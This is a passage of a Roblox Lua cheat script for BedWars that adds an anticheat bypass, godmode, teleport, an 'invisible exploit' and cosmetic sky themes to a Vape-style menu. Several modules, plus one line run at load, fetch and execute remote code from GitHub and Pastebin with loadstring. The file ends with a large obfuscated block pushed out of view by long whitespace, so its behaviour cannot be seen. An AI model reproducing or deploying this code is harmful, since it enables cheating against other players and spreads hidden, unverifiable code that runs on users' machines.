		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if bd<1 then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring else bl=1 end else if 3~=bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 1==bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 5~=bk then for bj=0,(cv-1)do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 2>bj then cx=(cx+1)else da=bh(be(bi,cx,((cx+cz)-1)),36)end end else if bj<=3 then cx=cx+cz else if bj==4 then return da else break end end end bj=bj+1 end end else if 7==bk then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while(cx<#bi and#a==d)do local a=cy()if cw[a]then ct=cw[a]else ct=(cs..be(cs,1,1))end cw[cv]=cs..be(ct,1,1)cu[#cu+1],cs,cv=ct,ct,cv+1 end else if bk<11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if 5>bd then bo={}else c={y,m,l,j,k,i,u,s,q,x,w,o,nil,nil,nil,nil};end else if bd<=6 then bp=v else if 7<bd then br,bs=1,((-136+(function()local a,b,c,d=0 while true do if a<=1 then if 0<a then d=(function(q,s,v,w)local x=0 while true do if 1>x then s(q(s,s,s,v),w(v,v,q,v),q(q,v,v,q),(s(w,(w and w),(s and v),w and v)and s(v,v,w,q and q)))else break end x=x+1 end end)(function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if(b>142)then return s end else if 2~=x then b=(b+1)else c=((c*110))%5093 end end else if x<=3 then if((c%1260)<630)then return w(v(s,w,(s and w),q)and s(s,v,q and q,(q and v)),s(w,q,w and v,w and s),s(v and s,q,s,(q and s)),v(q,v,w,s))else return w end else if x~=5 then return v else break end end end x=x+1 end end,function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if b>494 then return v end else if 2>x then b=(b+1)else c=((c-637)%2422)end end else if x<=3 then if(c%1402)>701 then return s(s(w,q,q,s),s(q,s,s,q),s(v,v,s,v),q(s,q,w,w))else return s end else if x<5 then return s else break end end end x=x+1 end end,function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if(b>220)then return q end else if 1<x then c=((c*870)%25510)else b=b+1 end end else if x<=3 then if(c%1696)>848 then return w else return q(q(q,q,s,s),w(q,w,s,q),v(q,v,w,v and s),q(v,w,w,w))end else if 4<x then break else return s(w(q,q,q,(v and s)),q(q,s,s,q and w),q(s,v and w,s,w),v(v,s,q,q))end end end x=x+1 end end,function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if b>494 then return w end else if 1<x then c=((c+618))%10092 else b=b+1 end end else if x<=3 then if((c%696)<348)then return s else return s((w(q,s and s,q,v)and s(q,v and v,w,q)),q(s,w,w and s,v)and v(q,q,s,q),(v(s,q,s,w and q)and q(q,w,q,s)),s(q,v and v,q,w))end else if x<5 then return s(q(s,v,w,v),q(q,w,q,s),s(s,q,v,w),q(w,v,w,q))else break end end end x=x+1 end end)else b,c=0,1 end else if 2<a then break else return c;end end a=a+1 end end)()))else bq=bp(bo)end end end end else if bd<=12 then if bd<=10 then if 10>bd then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c~=1 then d=0 else for q=0,31 do local s=(a%2)local v=(b%2)if not(s~=0)then if not(v~=1)then b=(b-1)d=(d+2^q)end else a=(a-1)if not(v~=0)then d=(d+2^q)else b=b-1 end end b=b/2 a=a/2 end end else if c<3 then return d else break end end c=c+1 end end end else if bd==11 then bv=function(a,b)local c=0 while true do if c<1 then return((a*2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=br+2;else if 3<a then break else return(bv(c,8))+b;end end end a=a+1 end end end end else if bd<=14 then if bd<14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 1~=c then return p((a/2^b));else break end c=c+1 end end else if 17~=bd then bz=2^32-1 else ca=function(a,b)local c=0 while true do if c>0 then break else return((a+b)-bu(a,b))/2 end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 18<bd then cc=function(a,b)local c=0 while true do if c<1 then return bz-ca(bz-a,bz-b)else break end c=c+1 end end else cb=bw()end else if bd==20 then cd=function(a,b,c)local d=0 while true do if 1>d then if c then local c=(((a/2^(b-1)))%(2^((c-1)-(b-1)+1)))return(c-c%1)else local b=(2^(b-1))return(((a%((b+b))>b or a%((b+b))==b))and 1 or 0)end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if 23>bd then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 0==a then b,c,d,p=h(bn,br,(br+3))else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=(br+4);else if 4>a then return((bv(p,24)+bv(d,16)+bv(c,8))+b);else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if a~=1 then b=bu(h(bn,br,br),cb)else br=br+1;end else if 2==a then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 26>bd then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if a>1 then break else while true do if b<=10 then if(b<=4)then if(b<=1)then if(b>0)then d=48533 else c=526 end else if(b<2 or b==2)then p=3 else if(b~=4)then q=270 else s=540 end end end else if(b==7 or b<7)then if b<=5 then v=12318 else if 7>b then w=385 else x=137 end end else if(b<=8)then y=35083 else if not(b~=9)then be=254 else bf=340 end end end end else if(b<15 or b==15)then if(b==12 or b<12)then if(11<b)then bh=170 else bg=2 end else if b<=13 then bi=19255 else if not(15==b)then bj=1 else bk=423 end end end else if b<=18 then if b<=16 then bs=240 else if not(b~=17)then bw=0 else by,bz=bw,bj end end else if(b<=19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 1==cs then while true do if not(1==ct)then ce(cc(cc,cc)and cc(cc,cc),(ce(ce,((cc and cc)))and ce(cc,ce)))else break end ct=(ct+1)end else break end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs>1 then break else while true do if(ct<2 or ct==2)then if ct<=0 then if by>bs then local bs=bw while true do bs=(bs+bj)if not((bs~=bj))then return ce else break end end end else if 2>ct then by=((by+bj))else bz=(((bz-bk)%bi))end end else if ct<=3 then if(((bz%bf)<bh))then local bf=bw while true do bf=(bf+bj)if(((bf>bg)or bf==bg))then if(bf<p)then return ce(cc(cc,(cc and ce)),ce(cc,cc))else break end else bz=((bz+be)%y)end end else local y=bw while true do y=((y+bj))if((y<bg))then return ce else break end end end else if ct<5 then return cc else break end end end ct=ct+1 end end end cs=cs+1 end end,function(y,be)local bf,bh=0 while true do if bf<=0 then bh=0 else if bf<2 then while true do if(bh==2 or bh<2)then if bh<=0 then if(by>x)then local x=bw while true do x=(x+bj)if not(not(x==bg))then break else return y end end end else if 2~=bh then by=by+bj else bz=(((bz*w)%v))end end else if(bh==3 or bh<3)then if((bz%s)>q)then local q=bw while true do q=((q+bj))if(not(q~=bj)or q<bj)then bz=((bz*c))%d else if not(not(q==p))then break else return y(be(y,be),y(be,y))end end end else local c=bw while true do c=c+bj if((c<bg))then return y else break end end end else if not(bh==5)then return be else break end end end bh=bh+1 end else break end end bf=bf+1 end end)else if 20==b then return bz;else break end end end end end b=b+1 end end end a=a+1 end end)()));else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if 28>bd then cj=(-1671+(function()local a=409;local b=818;local c=28939;local d=222;local p=389;local q=38485;local s=1166;local v=583;local w=9454;local x=425;local y=4509;local be=442;local bf=292;local bg=3;local bh=1696;local bi=848;local bj=579;local bk=10108;local bs=252;local bw=908;local by=5205;local bz=470;local ca=746;local cc=1816;local ce=18568;local cs=2;local ct=1;local cu=421;local cv=0;local cw,cx=cv,ct;local a=(function(cy,cz,da,db)cy(cz(db,db,da,db),da(cz,cy,cz,db),da(da,cz,da,da),db(cz and cy,db,da,da))end)(function(cy,cz,da,db)if(cw>cu)then local cu=cv while true do cu=(cu+ct)if(cu<cs)then return cz else break end end end cw=cw+ct cx=(cx+ca)%ce if((cx%cc)==bw 